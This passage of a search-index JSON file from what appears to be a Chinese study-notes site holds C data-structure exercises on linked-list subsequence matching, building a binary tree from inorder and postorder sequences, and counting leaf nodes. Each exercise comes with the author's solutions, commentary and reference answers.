(akm[m][n]);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#ba","title":"\u5224\u65ad\u5e8f\u5217B\u662f\u5426\u662f\u5e8f\u5217A\u7684\u5b50\u5e8f\u5217","text":"<p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u4e24\u4e2a\u6574\u6570\u5e8f\u5217<code>A=a1,a2,a3,...,am</code>\u548c<code>B=b1,b2,b3,...,bn</code>\u5df2\u7ecf\u5b58\u5165\u4e24\u4e2a\u5355\u94fe\u8868\u4e2d\uff0c\u8bbe\u8ba1\u4e00\u4e2a\u7b97\u6cd5\uff0c\u5224\u65ad\u5b57\u7b26\u4e32B\u662f\u5426\u662f\u5b57\u7b26\u4e32A\u7684\u5b50\u4e32\u3002\u5982\u679c\u662f\uff0c\u5219\u8f93\u51fa<code>YES</code>\uff1b\u5982\u679c\u4e0d\u662f\uff0c\u5219\u8f93\u51fa<code>NO</code>\u3002</p> <p>\u793a\u4f8b\uff1a</p> <p>\u8f93\u5165</p> Text Only<pre><code>3,2\uff08\u4e24\u4e2a\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\uff09\n1\uff08A\u94fe\u8868\u7684\u7b2c 1 \u4e2a\u5143\u7d20\uff09\n2\uff08A\u94fe\u8868\u7684\u7b2c 2 \u4e2a\u5143\u7d20\uff09\n3\uff08A\u94fe\u8868\u7684\u7b2c 3 \u4e2a\u5143\u7d20\uff09\n1\uff08B\u94fe\u8868\u7684\u7b2c 1 \u4e2a\u5143\u7d20\uff09\n2\uff08B\u94fe\u8868\u7684\u7b2c 2 \u4e2a\u5143\u7d20\uff09\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>YES\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_24","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct LNode {\n    int data;\n    struct LNode *next;\n} LNode, *LinkList;\n\nvoid Create_LinkList(LinkList *L, int n) {\n    // \u521b\u5efa\u94fe\u8868\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nvoid print_LinkList(LinkList L) {\n    // \u8f93\u51fa\u94fe\u8868\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint Sub_Sequence(LinkList La, LinkList Lb) {\n    // \u5224\u65ad\u5b57\u7b26\u4e32B\u662f\u5426\u662f\u5b57\u7b26\u4e32A\u7684\u5b50\u4e32\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint main() {\n    // \u521b\u5efa2\u4e2a\u94fe\u8868\n    LinkList La, Lb;\n    // \u8f93\u5165\u6570\u636e\n    int m, n;\n    printf(\"\u4e24\u4e2a\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\u5206\u522b\u4e3a\uff1a\");\n    scanf(\"%d,%d\", &amp;m, &amp;n); // \u8f93\u5165\u4ee5\u9017\u53f7\u5206\u9694\u5f00\n    printf(\"\u8bf7\u8f93\u5165\u7b2c1\u4e2a\u94fe\u8868\u7684\u6570\u636e\uff1a\\n\");\n    Create_LinkList(&amp;La, m);\n    printf(\"\u8bf7\u8f93\u5165\u7b2c2\u4e2a\u94fe\u8868\u7684\u6570\u636e\uff1a\\n\");\n    Create_LinkList(&amp;Lb, n);\n    if (Sub_Sequence(La, Lb))\n        printf(\"\\nYES\\n\");\n    else\n        printf(\"\\nNO\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_25","title":"\u7b54\u6848","text":"<p>\u5728<code>Sub_Sequence</code>\u51fd\u6570\u4e2d\uff0c\u4f7f\u7528\u4e24\u4e2a\u6307\u9488<code>pa</code>\u548c<code>pb</code>\u5206\u522b\u6307\u5411\u94fe\u8868A\u548c\u94fe\u8868B\u7684\u5934\u8282\u70b9\u3002 \u901a\u8fc7\u6bd4\u8f83<code>pa</code>\u548c<code>pb</code>\u6307\u5411\u7684\u8282\u70b9\u7684\u503c\uff0c\u82e5\u76f8\u7b49\uff0c\u5219\u4e24\u4e2a\u6307\u9488\u540c\u65f6\u540e\u79fb\u4e00\u4f4d\uff1b\u82e5\u4e0d\u76f8\u7b49\uff0c\u5219\u5c06<code>pb</code>\u91cd\u65b0\u6307\u5411\u94fe\u8868B\u7684\u5934\u8282\u70b9\uff0c\u5e76\u5c06pa\u540e\u79fb\u4e00\u4f4d\u3002 \u91cd\u590d\u4e0a\u8ff0\u6b65\u9aa4\uff0c\u76f4\u5230\u94fe\u8868A\u904d\u5386\u5b8c\u6bd5\u6216\u8005\u94fe\u8868B\u904d\u5386\u5b8c\u6bd5\u3002 \u82e5\u94fe\u8868B\u904d\u5386\u5b8c\u6bd5\uff0c\u5219\u8bf4\u660eB\u662fA\u7684\u5b50\u4e32\uff1b\u5426\u5219\uff0cB\u4e0d\u662fA\u7684\u5b50\u4e32\u3002</p> <p><code>print_LinkList()</code>\u4e5f\u6ca1\u6709\u8c03\u7528\u5440\uff0c\u600e\u4e48\u8fd8\u8ba9\u8865\u5168\u5462\u54c8\u54c8\u54c8\u54c8</p> C<pre><code>void Create_LinkList(LinkList* L, int n) {\n    // \u521b\u5efa\u94fe\u8868\n    *L = (LinkList)malloc(sizeof(LNode));\n    (*L)-&gt;next = NULL;\n    LinkList p = *L;\n    int i, temp;\n    for (i = 0; i &lt; n; i++) {\n        scanf(\"%d\", &amp;temp);\n        LinkList newNode = (LinkList)malloc(sizeof(LNode));\n        newNode-&gt;data = temp;\n        newNode-&gt;next = NULL;\n        p-&gt;next = newNode;\n        p = p-&gt;next;\n    }\n}\n\nvoid print_LinkList(LinkList L) {\n    // \u8f93\u51fa\u94fe\u8868\n    LinkList p = L-&gt;next;\n    while (p) {\n        printf(\"%d \", p-&gt;data);\n        p = p-&gt;next;\n    }\n    printf(\"\\n\");\n}\n\nint Sub_Sequence(LinkList La, LinkList Lb) {\n    // \u5224\u65ad\u5b57\u7b26\u4e32B\u662f\u5426\u662f\u5b57\u7b26\u4e32A\u7684\u5b50\u4e32\n    LinkList pa = La-&gt;next;\n    LinkList pb = Lb-&gt;next;\n    while (pa &amp;&amp; pb) {\n        if (pa-&gt;data == pb-&gt;data) {\n            pa = pa-&gt;next;\n            pb = pb-&gt;next;\n        }\n        else {\n            pa = pa-&gt;next;\n            pb = Lb-&gt;next;\n        }\n    }\n\n    if (pb == NULL) {\n        return 1; // B\u662fA\u7684\u5b50\u4e32\n    }\n    else {\n        return 0; // B\u4e0d\u662fA\u7684\u5b50\u4e32\n    }\n}\n</code></pre> <p>\u5176\u5b9e<code>Sub_Sequence()</code>\u8c8c\u4f3c\u6709\u70b9\u903b\u8f91\u4e0a\u7684\u9519\u8bef\uff0c\u5c31\u662f\u4e0d\u5339\u914d\u7684\u65f6\u5019<code>pa</code>\u5c31\u76f4\u63a5\u9012\u5f52\u5230<code>pa-&gt;next</code>\u4e86\uff0c\u800c\u6b63\u786e\u505a\u6cd5\u5e94\u8be5\u662f\u9012\u5f52\u5230<code>pa</code>\u5f00\u59cb\u5339\u914d\u7684\u4e0b\u4e00\u4e2a\u5b57\u7b26\uff08\u4e0d\u662f\u5339\u914d\u7ed3\u675f\u540e\u7684\u4e0b\u4e00\u4e2a\u5b57\u7b26\uff09</p> <p>\u4f46\u662f\u8fd9\u6837\u5b50\u5c45\u7136\u901a\u8fc7\u68c0\u67e5\u4e86\u3002</p> <p>\u4f46\u662f\u6211\u4eec\u8fd8\u662f\u4fee\u6539\u4e00\u4e0b\u5427\uff0c\u518d\u5f15\u5165\u4e00\u4e2a<code>LinkList temp = pa;</code></p> C<pre><code>int Sub_Sequence(LinkList La, LinkList Lb) {\n    // \u5224\u65ad\u5b57\u7b26\u4e32B\u662f\u5426\u662f\u5b57\u7b26\u4e32A\u7684\u5b50\u4e32\n    LinkList pa = La-&gt;next;\n    LinkList pb = Lb-&gt;next;\n\n    LinkList temp = pa;\n    while (temp &amp;&amp; pb) {\n        if (temp-&gt;data == pb-&gt;data) {\n            temp = temp-&gt;next;\n            pb = pb-&gt;next;\n        }\n        else {\n            temp = pa-&gt;next;\n            pa = pa-&gt;next;\n            pb = Lb-&gt;next;\n        }\n    }\n\n    if (pb == NULL) {\n        return 1; // B\u662fA\u7684\u5b50\u4e32\n    }\n    else {\n        return 0; // B\u4e0d\u662fA\u7684\u5b50\u4e32\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_26","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>void Create_LinkList(LinkList* L, int n) {\n    // \u521b\u5efa\u94fe\u8868\n    *L = (LinkList)malloc(sizeof(LNode)); // \u521b\u5efa\u5934\u7ed3\u70b9\n    (*L)-&gt;next = NULL;\n    LinkList rear; // \u5c3e\u6307\u9488\n    rear = *L;     // \u6307\u5411\u5934\u7ed3\u70b9\n    for (int i = 0; i &lt; n; i++) {\n        LinkList p = (LinkList)malloc(sizeof(LNode)); // \u7ed9\u65b0\u7ed3\u70b9\u521b\u5efa\u7a7a\u95f4\n        p-&gt;next = NULL;\n        printf(\"\u5355\u94fe\u8868\u4e2d\u7b2c%2d\u4e2a\u5143\u7d20\u662f\uff1a\", i + 1);   // \u4e0b\u6807\u662f\u4ece0\u5f00\u59cb\u7684\uff0c\u5f97\u52a01\n        scanf(\"%d\", &amp;p-&gt;data);\n        rear-&gt;next = p; // \u65b0\u7ed3\u70b9\u63d2\u5165\u94fe\u8868\u5c3e\u90e8\n        rear = p;       // rear\u6307\u5411\u65b0\u7684\u5c3e\u8282\u70b9\n    }\n}\n\nvoid print_LinkList(LinkList L) {\n    // \u8f93\u51fa\u94fe\u8868\n    LinkList p = L;\n    while (p-&gt;next != NULL) {\n        p = p-&gt;next; // \u8df3\u8fc7\u5934\u7ed3\u70b9\u8f93\u51fa\u4e0b\u4e00\u4e2a\u7ed3\u70b9\u4e2d\u5b58\u50a8\u7684\u6570\u503c\n        printf(\"%d\", p-&gt;data);\n    }\n}\n\nint Sub_Sequence(LinkList La, LinkList Lb) {\n    // \u5224\u65ad\u5b57\u7b26\u4e32B\u662f\u5426\u662f\u5b57\u7b26\u4e32A\u7684\u5b50\u4e32\n\n    LinkList pa = La, pb = Lb, first = pa; // first\u8bb0\u5f55\u6bcf\u4e00\u6b21\u7684\u5b50\u4e32\u9996\u5143\u7d20\n    while (pa &amp;&amp; pb) {\n        if (pa-&gt;data == pb-&gt;data) {\n            pa = pa-&gt;next;\n            pb = pb-&gt;next;\n        }\n        else {\n            first = first-&gt;next; // \u4e0b\u4e00\u4e2afirst\u9a8c\u8bc1\n            pa = first;          // pa\u4ecefirst\u904d\u5386\n            pb = Lb;             // pb\u4ece\u5f00\u59cb\u904d\u5386\n        }\n    }\n    if (pb == NULL) // A\u672a\u7ed3\u675f\uff0cB\u7ed3\u675f\u4e86\n        return 1;    // YES\n    else             // A\u5b8c\u4e86\uff0cB\u6ca1\u5b8c\n        return 0;    // NO\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/","title":"Alpha \u6570\u548c\u4e8c\u53c9\u6811","text":"<p>\u7f16\u5199\u4e8e\uff1a2024-04-11</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_1","title":"\u4e8c\u53c9\u6811\u7684\u5efa\u7acb","text":"<p>\u6839\u636e\u4e8c\u53c9\u6811\u7684\u4e2d\u5e8f\u548c\u540e\u5e8f\u5e8f\u5217\uff0c\u5efa\u7acb\u4e8c\u53c9\u6811</p> <p>\u5df2\u77e5\u4e00\u4e2a\u4e8c\u53c9\u6811\u7684\u4e2d\u5e8f\u5e8f\u5217\u548c\u540e\u5e8f\u5e8f\u5217\uff0c\u5b8c\u6210<code>CreateBitree</code>\u51fd\u6570\uff0c\u5b9e\u73b0\u5efa\u7acb\u8be5\u4e8c\u53c9\u6811\u7684\u4e8c\u53c9\u94fe\u8868\u5b58\u50a8\u7ed3\u6784\u7684\u529f\u80fd\u3002</p> <p>\u793a\u4f8b\u8f93\u51fa</p> Text Only<pre><code>A B D E C F G \n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_2","title":"\u9898\u76ee","text":"C<pre><code>//\u5df2\u77e5\u4e00\u4e2a\u4e8c\u53c9\u6811\u7684\u4e2d\u5e8f\u5e8f\u5217\u548c\u540e\u5e8f\u5e8f\u5217\uff0c\u5b8c\u6210CreateBitree\u51fd\u6570\uff0c\u5b9e\u73b0\u5efa\u7acb\u8be5\u4e8c\u53c9\u6811\u7684\u4e8c\u53c9\u94fe\u8868\u5b58\u50a8\u7ed3\u6784\u7684\u529f\u80fd\n#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;string.h&gt;\n\n//\u4e8c\u53c9\u6811\u7684\u5b58\u50a8\u8868\u793a \ntypedef char TElemType;\ntypedef struct BiTNode{\n    TElemType data;\n    struct BiTNode *lchild, * rchild;   //\u5de6\u53f3\u5b69\u5b50\u6307\u9488 \n}BiTNode, *BiTree;\n\n\n//inorder\u548cpostorder\u662f\u4e8c\u53c9\u6811\u7684\u4e2d\u5e8f\u5e8f\u5217\u548c\u540e\u5e8f\u5e8f\u5217\n//lowin,highin\u662f\u4e2d\u5e8f\u5e8f\u5217\u7b2c\u4e00\u548c\u6700\u540e\u7ed3\u70b9\u7684\u4e0b\u6807\n//lowpost,highpost \u662f\u540e\u5e8f\u5e8f\u5217\u7b2c\u4e00\u548c\u6700\u540e\u7ed3\u70b9\u7684\u4e0b\u6807\n//\u8fd4\u56de\uff1a\u4e8c\u53c9\u6811\u7684\u6839\u7ed3\u70b9\u6307\u9488 \nBiTree CreateBitree(TElemType inorder[], TElemType postorder[], int lowin, int highin, int lowpost, int highpost)\n{\n    //\u8bf7\u5b8c\u6210\u6b64\u51fd\u6570\u4ee3\u7801\n\n}\n\n\n//\u6309\u524d\u5e8f\u9012\u5f52\u904d\u5386\u4e8c\u53c9\u6811 \nvoid preorder(BiTree t)\n{\n    if(t)\n    {\n        printf(\"%c \",t-&gt;data);\n        if(t-&gt;lchild)\n            preorder(t-&gt;lchild);\n        if(t-&gt;rchild)\n            preorder(t-&gt;rchild);\n    }\n}\n\nint main()\n{\n    TElemType in[]=\"DBEAFCG\";//\u4e2d\u5e8f \n    TElemType post[]=\"DEBFGCA\"; //\u540e\u5e8f \n    BiTree t;\n    t = CreateBitree(in, post, 0,strlen(in)-1,0,strlen(post)-1);\n    preorder(t);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_3","title":"\u7b54\u6848","text":"<p><code>CreateBitree</code>\u51fd\u6570\u7684\u53c2\u6570\u5982\u4e0b\uff1a</p> <ol> <li><code>inorder[]</code>\uff1a\u4e8c\u53c9\u6811\u7684\u4e2d\u5e8f\u5e8f\u5217\u6570\u7ec4\uff0c\u7528\u4e8e\u786e\u5b9a\u8282\u70b9\u7684\u76f8\u5bf9\u4f4d\u7f6e\u548c\u6784\u5efa\u5de6\u53f3\u5b50\u6811\u3002</li> <li><code>postorder[]</code>\uff1a\u4e8c\u53c9\u6811\u7684\u540e\u5e8f\u5e8f\u5217\u6570\u7ec4\uff0c\u7528\u4e8e\u786e\u5b9a\u6839\u8282\u70b9\u548c\u6784\u5efa\u5de6\u53f3\u5b50\u6811\u3002</li> <li><code>lowin</code>\uff1a\u4e2d\u5e8f\u5e8f\u5217\u4e2d\u5f53\u524d\u5b50\u6811\u7684\u8d77\u59cb\u7d22\u5f15\u3002</li> <li><code>highin</code>\uff1a\u4e2d\u5e8f\u5e8f\u5217\u4e2d\u5f53\u524d\u5b50\u6811\u7684\u7ed3\u675f\u7d22\u5f15\u3002</li> <li><code>lowpost</code>\uff1a\u540e\u5e8f\u5e8f\u5217\u4e2d\u5f53\u524d\u5b50\u6811\u7684\u8d77\u59cb\u7d22\u5f15\u3002</li> <li><code>highpost</code>\uff1a\u540e\u5e8f\u5e8f\u5217\u4e2d\u5f53\u524d\u5b50\u6811\u7684\u7ed3\u675f\u7d22\u5f15\u3002</li> </ol> <p>\u901a\u8fc7<code>lowin</code>\u548c<code>highin</code>\u53c2\u6570\u786e\u5b9a\u5f53\u524d\u5b50\u6811\u5728\u4e2d\u5e8f\u5e8f\u5217\u4e2d\u7684\u8303\u56f4\uff0c\u901a\u8fc7<code>lowpost</code>\u548c<code>highpost</code>\u53c2\u6570\u786e\u5b9a\u5f53\u524d\u5b50\u6811\u5728\u540e\u5e8f\u5e8f\u5217\u4e2d\u7684\u8303\u56f4\u3002\u6839\u636e\u8fd9\u4e9b\u53c2\u6570\u7684\u7ec4\u5408\uff0c\u51fd\u6570\u9012\u5f52\u5730\u6784\u5efa\u4e8c\u53c9\u6811\uff0c\u8fd4\u56de\u5f53\u524d\u5b50\u6811\u7684\u6839\u8282\u70b9\u6307\u9488\u3002</p> <p>\u51fd\u6570\u901a\u8fc7\u540e\u5e8f\u5e8f\u5217\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u786e\u5b9a\u5f53\u524d\u5b50\u6811\u7684\u6839\u8282\u70b9\uff0c\u7136\u540e\u5728\u4e2d\u5e8f\u5e8f\u5217\u4e2d\u627e\u5230\u6839\u8282\u70b9\u7684\u4f4d\u7f6e\uff0c\u8fdb\u800c\u5212\u5206\u51fa\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811\u7684\u8303\u56f4\u3002\u7136\u540e\u9012\u5f52\u5730\u6784\u5efa\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811\uff0c\u5e76\u5c06\u5b83\u4eec\u8fde\u63a5\u5230\u5f53\u524d\u6839\u8282\u70b9\u7684\u5de6\u5b69\u5b50\u548c\u53f3\u5b69\u5b50\u4e0a\u3002</p> <p>\u6700\u7ec8\uff0c\u51fd\u6570\u8fd4\u56de\u6574\u68f5\u4e8c\u53c9\u6811\u7684\u6839\u8282\u70b9\u6307\u9488\u3002</p> <p>\u8fd8\u6709\u5c31\u662f\u9700\u8981\u6dfb\u52a0\u4e00\u4e2a<code>findIndex()</code>\u51fd\u6570</p> <p>\uff08\u6211\u53d1\u73b0\u6211\u4e00\u76f4\u5bf9\u6570\u7ec4\u91cc\u9762\u8fd9\u4e9b\u6c42\u4e0b\u6807\u65f6\u5019\u7684<code>+1</code>\u3001<code>-1</code>\u641e\u4e0d\u592a\u6e05\u695a\uff09</p> C<pre><code>//\u5728\u4e2d\u5e8f\u5e8f\u5217inorder\u4e2d\u67e5\u627e\u5143\u7d20value\u7684\u7d22\u5f15\nint findIndex(TElemType inorder[], int low, int high, TElemType value) {\n    int i;\n    for (i = low; i &lt;= high; i++) {\n        if (inorder[i] == value) {\n            return i;\n        }\n    }\n    return -1;\n}\n\n\n//\u6839\u636e\u4e2d\u5e8f\u5e8f\u5217\u548c\u540e\u5e8f\u5e8f\u5217\u521b\u5efa\u4e8c\u53c9\u6811\nBiTree CreateBitree(TElemType inorder[], TElemType postorder[], int lowin, int highin, int lowpost, int highpost)\n{\n    // \u540e\u5e8f\u5e8f\u5217\u4e3a\u7a7a\uff0c\u5219\u8fd4\u56de\u7a7a\u4e8c\u53c9\u6811\n    if (lowin &gt; highin || lowpost &gt; highpost) {\n        return NULL;\n    }\n\n    // \u540e\u5e8f\u5e8f\u5217\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u4e3a\u5f53\u524d\u5b50\u6811\u7684\u6839\u8282\u70b9\n    TElemType rootValue = postorder[highpost];\n\n    // \u521b\u5efa\u6839\u7ed3\u70b9\n    BiTree root = (BiTree)malloc(sizeof(BiTNode));\n    root-&gt;data = rootValue;\n    root-&gt;lchild = NULL;\n    root-&gt;rchild = NULL;\n\n    // \u5728\u4e2d\u5e8f\u5e8f\u5217\u4e2d\u627e\u5230\u6839\u8282\u70b9\u7684\u4f4d\u7f6e\n    int rootIndex = findIndex(inorder, lowin, highin, rootValue);\n\n    // \u6839\u636e\u6839\u8282\u70b9\u7684\u4f4d\u7f6e\uff0c\u5212\u5206\u5de6\u53f3\u5b50\u6811\u7684\u8303\u56f4\n    int leftSize = rootIndex - lowin;\n    int rightSize = highin - rootIndex;\n\n    // \u9012\u5f52\u6784\u5efa\u5de6\u53f3\u5b50\u6811\n    root-&gt;lchild = CreateBitree(inorder, postorder, lowin, rootIndex - 1, lowpost, lowpost + leftSize - 1);\n    root-&gt;rchild = CreateBitree(inorder, postorder, rootIndex + 1, highin, highpost - rightSize, highpost - 1);\n\n    return root;\n}\n</code></pre> <p>\u6807\u51c6\u7b54\u6848\uff0c\u4e5f\u5c31\u662f\u4e0b\u4e00\u4e2a\u9898\u7684\u4ee3\u7801\uff0c\u5173\u4e8e<code>CreateBitree()</code>\u6709\u79cd\u66f4\u7b80\u6d01\u7684\u5b9e\u73b0\u65b9\u6cd5\uff0c\u4e5f\u6ca1\u6709\u5916\u7f6e<code>findIndex()</code>\uff08\u4ece\u7b2c\u4e8c\u9898\u7684\u793a\u4f8b\u4ee3\u7801\u5077\u7684\u54c8\u54c8\u54c8\uff09</p> <p>\u4e0d\u8fc7\u90fd\u662f\u4e00\u6837\u7684\uff0c\u5199\u8d77\u6765\u7b80\u6d01\u4e00\u4e9b\u800c\u5df2</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_4","title":"\u6807\u51c6\u7b54\u6848\uff08\u8003\u8bd5\u7528\u8fd9\u4e2a\uff09","text":"C<pre><code>BiTree CreateBitree(TElemType inorder[], TElemType postorder[], int lowin, int highin, int lowpost, int highpost)\n{\n    BiTree bt = (BiTree)malloc(sizeof(BiTNode));// \u7533\u8bf7\u7ed3\u70b9\n    bt-&gt;data = postorder[highpost];// \u540e\u5e8f\u904d\u5386\u7684\u6700\u540e\u4e00\u4e2a\u7ed3\u70b9\u662f\u6839\u7ed3\u70b9\n\n    int i = lowin;\n    while (inorder[i] != postorder[highpost]) { // \u5728\u4e2d\u5e8f\u5e8f\u5217\u4e2d\u67e5\u627e\u6839\u7ed3\u70b9\n        i++;\n    }\n\n    if (i == lowin) {\n        bt-&gt;lchild = NULL;  // \u5904\u7406\u5de6\u5b50\u6811\n    }\n    else {\n        bt-&gt;lchild = CreateBitree(inorder, postorder, lowin, i - 1, lowpost, lowpost + i - lowin - 1);\n    }\n\n    if (i == highin) {\n        bt-&gt;rchild = NULL;  // \u5904\u7406\u53f3\u5b50\u6811\n    }\n    else {\n        bt-&gt;rchild = CreateBitree(inorder, postorder, i + 1, highin, lowpost + i - lowin, highpost - 1);\n    }\n\n    return bt;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_5","title":"\u4e8c\u53c9\u6811\u7684\u53f6\u5b50\u7ed3\u70b9","text":"<p>\u5df2\u77e5\u4e00\u4e2a\u4e8c\u53c9\u6811\u7684\u4e2d\u5e8f\u5e8f\u5217\u548c\u540e\u5e8f\u5e8f\u5217\uff0c\u8bf7\u5b8c\u6210<code>CalLeafNum</code>\u51fd\u6570\uff0c\u8fd4\u56de\u4e8c\u53c9\u6811\u53f6\u5b50\u7ed3\u70b9\u7684\u4e2a\u6570\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_6","title":"\u9898\u76ee","text":"C<pre><code>//\u6c42\u4e8c\u53c9\u6811\u4e2d\u53f6\u5b50\u8282\u70b9\u7684\u4e2a\u6570\n\n#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;string.h&gt;\n\n//\u4e8c\u53c9\u6811\u7684\u5b58\u50a8\u8868\u793a \ntypedef char TElemType;\ntypedef struct BiTNode{\n    TElemType data;\n    struct BiTNode *lchild, * rchild;   //\u5de6\u53f3\u5b69\u5b50\u6307\u9488 \n}BiTNode, *BiTree;\n\n\n//\u8ba1\u7b97\u53f6\u7ed3\u70b9\u7684\u4e2a\u6570 \n//\u8fd4\u56de\uff1a\u53f6\u7ed3\u70b9\u7684\u4e2a\u6570 \nint CalLeafNum(BiTree t) {\n    //\u8bf7\u5728\u6b64\u586b\u5199\u4ee3\u7801 \n\n}\n\nBiTree CreateBitree(TElemType inorder[], TElemType postorder[], int lowin, int highin, int lowpost, int highpost)\n{\n    BiTree bt=(BiTree)malloc(sizeof(BiTNode));//\u7533\u8bf7\u7ed3\u70b9\n    bt-&gt;data=postorder[highpost];//\u540e\u5e8f\u904d\u5386\u7684\u6700\u540e\u4e00\u4e2a\u7ed3\u70b9\u662f\u6839\u7ed3\u70b9\n    int i = lowin;\n    while(inorder[i]!=postorder[highpost]) //\u5728\u4e2d\u5e8f\u5e8f\u5217\u4e2d\u67e5\u627e\u6839\u7ed3\u70b9\n       i++;\n    if(i==lowin)\n        bt-&gt;lchild=NULL;  //\u5904\u7406\u5de6\u5b50\u6811\n    else\n        bt-&gt;lchild=CreateBitree(inorder,postorder,lowin,i-1,lowpost,lowpost+i-lowin-1);\n    if(i==highin)\n        bt-&gt;rchild=NULL;  //\u5904\u7406\u53f3\u5b50\u6811\n    else\n        bt-&gt;rchild=CreateBitree(inorder,postorder,i+1,highin,lowpost+i-lowin,highpost-1);\n    return bt;\n}\n\nint main()\n{\n    TElemType in[]=\"FDGBAHEC\";//\u4e2d\u5e8f \n    TElemType post[]=\"FGDBHECA\";    //\u540e\u5e8f \n    BiTree t;\n    t = CreateBitree(in, post, 0,strlen(in)-1,0,strlen(post)-1);\n    printf(\"%d\",CalLeafNum(t));\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_7","title":"\u7b54\u6848","text":"<p>\u5728\u7ed9\u5b9a\u7684\u4e2d\u5e8f\u5e8f\u5217\u548c\u540e\u5e8f\u5e8f\u5217\u6784\u5efa\u4e8c\u53c9\u6811\u540e\uff0c\u901a\u8fc7\u8c03\u7528<code>CalLeafNum</code>\u51fd\u6570\u8ba1\u7b97\u4e8c\u53c9\u6811\u7684\u53f6\u5b50\u8282\u70b9\u4e2a\u6570\uff0c\u5e76\u5c06\u7ed3\u679c\u6253\u5370\u51fa\u6765\u3002</p> <p>\u53ef\u4ee5\u770b\u770b\u8fd9\u4e2a\u9898\u793a\u4f8b\u7684<code>CreateBitree()</code>\u51fd\u6570\u3002</p> <p>\u90fd\u662f\u9012\u5f52\uff0c\u591a\u591a\u5c11\u5c11\u8fd8\u662f\u6709\u70b9\u96be\u7406\u89e3\u7684\uff0c\u8d77\u7801\u5bf9\u4e8e\u6211\u662f\u5982\u6b64\u3002</p> C<pre><code>//\u8ba1\u7b97\u53f6\u7ed3\u70b9\u7684\u4e2a\u6570 \nint CalLeafNum(BiTree t) {\n\n    // \u5982\u679c\u662f\u7a7a\u6811\n    if (t == NULL) {\n        return 0;\n    }\n\n    // \u5982\u679c\u662f\u53f6\u5b50\u8282\u70b9\n    if (t-&gt;lchild == NULL &amp;&amp; t-&gt;rchild == NULL) {\n        return 1; // \u53f6\u5b50\u8282\u70b9\n    }\n\n    int leftCount = CalLeafNum(t-&gt;lchild); // \u5de6\u5b50\u6811\u53f6\u5b50\u8282\u70b9\u4e2a\u6570\n    int rightCount = CalLeafNum(t-&gt;rchild); // \u53f3\u5b50\u6811\u53f6\u5b50\u8282\u70b9\u4e2a\u6570\n\n    return leftCount + rightCount;\n}\n</code></pre> <p>\u8fd9\u4e2a\u9898\u7528\u7684\u662f\u201c\u8ba1\u7b97\u53f6\u7ed3\u70b9\u7684\u4e2a\u6570\u201d\uff0c\u8fd9\u91cc\u518d\u9644\u4e0a\u4e00\u4e2a\u201c\u8ba1\u7b97\u4e8c\u53c9\u6811\u7684\u8282\u70b9\u4e2a\u6570\u201d\u7684\u7b97\u6cd5\uff1a</p> C<pre><code>int Count_Nodes(Bitree T) {\n    //\u8ba1\u7b97\u4e8c\u53c9\u6811\u7684\u8282\u70b9\u4e2a\u6570\n    if (T == NULL) {\n        return 0;\n    }\n    else {\n        return 1 + Count_Nodes(T-&gt;lchild) + Count_Nodes(T-&gt;rchild);\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_8","title":"\u6807\u51c6\u7b54\u6848\uff08\u90fd\u4e00\u6837\uff09","text":"C<pre><code>int CalLeafNum(BiTree t) {\n    if (t == NULL) {\n        return 0;\n    }\n    if (t-&gt;lchild == NULL &amp;&amp; t-&gt;rchild == NULL) {\n        return 1;\n    }\n    return CalLeafNum(t-&gt;lchild) + 